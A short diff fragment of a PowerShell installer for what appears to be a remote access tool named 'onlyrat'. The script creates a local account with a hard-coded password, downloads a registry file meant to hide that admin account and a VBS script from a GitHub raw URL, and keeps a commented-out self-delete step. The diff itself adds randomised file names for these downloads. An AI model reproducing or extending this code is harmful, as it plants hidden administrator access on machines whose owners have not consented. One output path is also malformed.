@@ -26,11 +26,11 @@ $pword = (ConvertTo-SecureString "onlyrat"--AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
 # registry to hide local admin
-
+$reg_file = random_text
 Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/admin.reg -OutFile "$reg_file.reg"
 
 # visual basic script to register the registry 
-
+$vbs_file = random_text
 Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/confirm.vbs -OutFile "$vbs_file.vbs".ps1
 
 #install registry 
@@ -52,3 +52,4 @@ cd $path
 #self delete
 # cd $initial_dir
 # del installer.ps1
+
